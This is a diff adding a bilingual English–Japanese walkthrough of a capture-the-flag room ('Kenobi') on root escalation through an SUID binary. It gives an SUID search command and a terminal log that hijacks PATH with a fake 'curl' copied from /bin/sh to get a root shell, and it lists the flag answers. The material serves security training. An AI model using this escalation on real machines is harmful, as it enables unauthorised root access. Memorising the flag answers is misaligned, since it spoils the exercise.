@@ -540,3 +540,168 @@ Kenobiのユーザーフラグ（/home/kenobi/user.txt）とは何ですか？
 ==== T3_#5:Answer
 
 d0b0f3f53b6caa532a83915e19224899
+
+== [Task 4] Privilege Escalation with Path Variable Manipulation
+
+=== #1
+
+==== #1:En
+
+++++
+<p align="left">
+  <img width="392" height="192" src="https://i.imgur.com/LN2uOCJ.png">
+</p>
+++++
+
+Lets first understand what what SUID, SGID and Sticky Bits are.
+
+s|Permission s|On Files s|On Directories
+|SUID Bit |User executes the file with permissions of the file owner |-
+|SGID Bit |User executes the file with the permission of the group owner. |File created in directory gets the same group owner.
+|Sticky Bit |No meaning |Users are prevented from deleting files from other users.
+
+==== #1:Ja
+
+まず、SUID、SGID、スティッキービットとは何かを理解しましょう。
+
+s|権限 s|ファイル s|ディレクトリ
+|SUIDビット |ユーザはファイル所有者の権限でファイルを実行します |-
+|SGIDビット |ユーザは、グループ所有者の許可を得てファイルを実行します。 |ディレクトリに作成されたファイルは、同じグループ所有者を取得します。
+|スティッキービット |意味なし |ユーザは他ユーザからファイルを削除できません。
+
+==== T4_#1:En
+
+
+#1	
+SUID bits can be dangerous, +
+some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), +
+however other custom files could that have the SUID bit can lead to all sorts of issues.
+
+To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null
+
+What file looks particularly out of the ordinary? 
+
+==== T4_#1:Ja
+
+SUIDビットは危険な場合があり、 +
+passwdなどの一部のバイナリは昇格された特権で実行する必要があるが（システムでパスワードをリセットするため）、 +
+SUIDビットを持つ他のカスタムファイルでは、あらゆる種類の問題が発生する可能性があります。
+
+これらのタイプのファイルをシステムで検索するには、次のコマンドを実行します: "find / -perm -u=s -type f 2>/dev/null"
+
+どのファイルが特に異常に見えるか？
+
+==== T4_#1:Solution
+
+自環境とKenobiの環境で下記コマンドを実行して、差分を確認してみる。
+
+----
+find / -perm -u=s -type f 2>/dev/null
+----
+
+==== T4_#1:Answer
+
+/usr/bin/menu
+
+=== #2
+
+==== T4_#2:En
+
+Run the binary, how many options appear?
+
+==== T4_#2:Ja
+
+バイナリを実行すると、いくつオプションが表示される？
+
+==== T4_#2:Solution
+
+----
+menu
+----
+
+==== T4_#2:Answer
+
+3
+
+=== #3
+
+==== T4_#3:En
+
+Strings is a command on Linux that looks for human readable strings on a binary.
+
+++++
+<p align="left">
+  <img width="177" height="56" src="https://i.imgur.com/toHFALv.png">
+</p>
+++++
+
+This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
+
+As this file runs as the root users privileges, we can manipulate our path gain a root shell.
+
+++++
+<p align="left">
+  <img width="442" height="182" src="https://i.imgur.com/OfMkDhW.png">
+</p>
+++++
+
+We copied the /bin/sh shell, called it curl, +
+gave it the correct permissions and then put its location in our path. +
+This meant that when the /usr/bin/menu binary was run, +
+its using our path variable to find the "curl" binary.. +
+Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
+
+==== T4_#3:Ja
+
+文字列は、人間が読めるバイナリ上の文字列を探すLinuxのコマンドです。
+
+これは、バイナリがフルパス無しで実行されていることを示しています（たとえば、/usr/bin/curlまたは/usr/bin/unameを使用していません）。
+
+このファイルはrootユーザー権限で実行されるため、パスを操作してrootシェルを取得できます。
+
+/bin/shシェル（curlと呼ばれる）をコピーし、適切なアクセス許可を与えて、その場所をパスに配置しました。
+これは、/usr/bin/menuバイナリが実行されたときに、パス変数を使用して "curl"バイナリを見つけることを意味します。
+これは、実際には/usr/shのバージョンであり、このファイルはrootとして実行されます。
+rootとしてシェルを実行します！
+
+==== T4_#3:Solution
+
+-
+
+==== T4_#3:Answer
+
+-
+
+=== #4
+
+==== T4_#4:En
+
+What is the root flag (/root/root.txt)?
+
+==== T4_#4:Ja
+
+rootフラグは何か(/root/root.txt)？
+
+==== T4_#4:Solution
+
+----
+kenobi@kenobi:~$ cd /tmp
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# cat /root/root.txt
+177b3cd8562289f37382721c28381f02
+----
+
+==== T4_#4:Answer
+
+177b3cd8562289f37382721c28381f02
